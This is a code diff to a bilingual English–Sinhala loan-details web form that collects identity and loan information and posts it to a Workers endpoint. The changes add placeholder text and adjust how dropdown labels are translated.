@@ -29,10 +29,10 @@
         </div>
 
         <form id="loan-form" action="https://phoneusagesurvey.zingobingo123.workers.dev" method="POST">
-            <input type="text" name="name" id="name" maxlength="100" required><br>
-            <input type="text" name="nic" id="nic" maxlength="20" required><br>
-            <input type="text" name="address" id="address" maxlength="200" required><br>
-            
+            <input type="text" name="name" id="name" maxlength="100" required placeholder="Your Name"><br>
+            <input type="text" name="nic" id="nic" maxlength="20" required placeholder="NIC Number"><br>
+            <input type="text" name="address" id="address" maxlength="200" required placeholder="Address"><br>
+
             <label for="district" id="district-label">Select District</label>
             <select name="district" id="district" required>
                 <option value="">Select District</option>
@@ -42,7 +42,7 @@
                 <option value="Matara">Matara</option>
             </select><br>
             
-            <input type="text" name="bankBranch" id="bankBranch" maxlength="20" required><br>
+            <input type="text" name="bankBranch" id="bankBranch" maxlength="20" required placeholder="Bank Branch"><br>
             
             <label for="loanScheme" id="loanScheme-label">Select Loan Scheme</label>
             <select name="loanScheme" id="loanScheme" required>
@@ -53,7 +53,7 @@
                 <option value="Scheme4">Scheme 4</option>
             </select><br>
             
-            <input type="text" name="loanNo" id="loanNo" maxlength="20" required><br>
+            <input type="text" name="loanNo" id="loanNo" maxlength="20" required placeholder="Loan Number"><br>
             
             <label for="victim" id="victim-label">Are you a victim?</label>
             <select name="victim" id="victim" required>
@@ -62,7 +62,7 @@
                 <option value="No">No</option>
             </select><br>
             
-            <input type="text" name="remarks" id="remarks" maxlength="200"><br>
+            <input type="text" name="remarks" id="remarks" maxlength="200" placeholder="Remarks"><br>
             
             <input type="hidden" name="recaptcha_response" id="recaptchaResponse">
 
@@ -87,7 +87,6 @@
                 "loanNo": "Loan Number",
                 "victim-label": "Are you a victim?",
                 "remarks": "Remarks",
-                "back-btn": "Back to Home",
                 "success-message": "✅ Your loan details have been submitted successfully! Redirecting..."
             },
             si: {
@@ -102,7 +101,6 @@
                 "loanNo": "ණය අංකය",
                 "victim-label": "ඔබට හානි වියද?",
                 "remarks": "සටහන්",
-                "back-btn": "මුල් පිටුවට",
                 "success-message": "✅ ඔබගේ දත්ත සාර්ථකව ඉදිරිපත් විය! නැවත යොමුවෙමින්..."
             }
         };
@@ -115,16 +113,14 @@
         function applyLanguage(lang) {
             document.getElementById("loan-title").innerText = translations[lang]["loan-title"];
             document.getElementById("submitBtn").innerText = translations[lang]["submitBtn"];
-            document.getElementById("name").placeholder = translations[lang]["name"];
-            document.getElementById("nic").placeholder = translations[lang]["nic"];
-            document.getElementById("address").placeholder = translations[lang]["address"];
             document.getElementById("district-label").innerText = translations[lang]["district-label"];
-            document.getElementById("bankBranch").placeholder = translations[lang]["bankBranch"];
             document.getElementById("loanScheme-label").innerText = translations[lang]["loanScheme-label"];
-            document.getElementById("loanNo").placeholder = translations[lang]["loanNo"];
             document.getElementById("victim-label").innerText = translations[lang]["victim-label"];
-            document.getElementById("remarks").placeholder = translations[lang]["remarks"];
             document.getElementById("success-message").innerText = translations[lang]["success-message"];
+
+            document.getElementById("district").options[0].text = translations[lang]["district-label"];
+            document.getElementById("loanScheme").options[0].text = translations[lang]["loanScheme-label"];
+            document.getElementById("victim").options[0].text = translations[lang]["victim-label"];
         }
 
         function loadLanguage() {
